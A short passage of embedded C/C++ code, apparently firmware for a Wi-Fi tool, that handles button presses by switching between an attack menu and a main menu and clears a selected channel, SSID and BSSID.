      mode = MODE_ATTACK_MENU;
      drawAttackMenu();
      resetInputFrontend();
      return;
    }
    if (btns.longClick) {
      selectedChannel = 0;
      selectedSSID[0] = '\0';
      memset(selectedBssid, 0, sizeof(selectedBssid));
      mode = MODE_MENU;
      drawMenu();
      resetInputFrontend();
      return;
    }
  }

  delay(5);
}
